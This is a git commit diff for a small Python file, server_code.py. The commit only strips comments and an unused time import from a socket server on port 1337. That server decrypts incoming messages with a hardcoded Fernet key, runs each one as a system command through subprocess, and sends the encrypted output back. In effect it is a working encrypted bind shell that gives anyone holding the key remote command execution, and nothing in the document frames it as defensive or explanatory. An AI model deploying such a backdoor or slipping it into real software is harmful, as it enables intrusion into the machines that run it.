3b52da48de7d1750ffe5a544ba273e7cd12d7394
Rohit Anantha <anantha.rohit.11@gmail.com>
2024-11-01 20:39:21 -0500

    removed extra lines

--- server_code.py
+++ server_code.py
@@ -1,22 +1,14 @@
 import socket
 import subprocess
 from cryptography.fernet import Fernet
-import time
 
 key = b'TQenjgBHJFv6Ep4v8eN0Bayf194BS6qV_X23n5ulnRQ='
 
 def server_program():
-    # get the hostname
-    port = 1337  # initiate port no above 1024
-
-    # look closely. The bind() function takes tuple as argument
-
-    # configure how many client the server can listen simultaneously
-    
     f = Fernet(key)
+    port = 1337 
 
     try:
-        # while True:
         server_socket = socket.socket()  # get instance
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server_socket.bind(('', port))  # bind host address and port together
@@ -27,7 +19,6 @@ def server_program():
         exit()
     
     conn, address = server_socket.accept()  # accept new connection
-    curr_time = time.localtime()
 
     while True:
         # receive data stream. it won't accept data packet greater than 1024 bytes
@@ -35,22 +26,17 @@ def server_program():
         if not data:
             # if data is not received break
             break
-        # before running commands auth using AES
         # we need a private key
         data = str(f.decrypt(data).decode())
         command = data
-        
         try:
-            result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
+            result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)            
         except :
             pass
             # send data to the client
         res = f.encrypt(result.stdout)
         conn.send(res)
     conn.close()  # close the connection
-    curr_time = time.localtime()
-            
 
 if __name__ == '__main__':
     server_program()
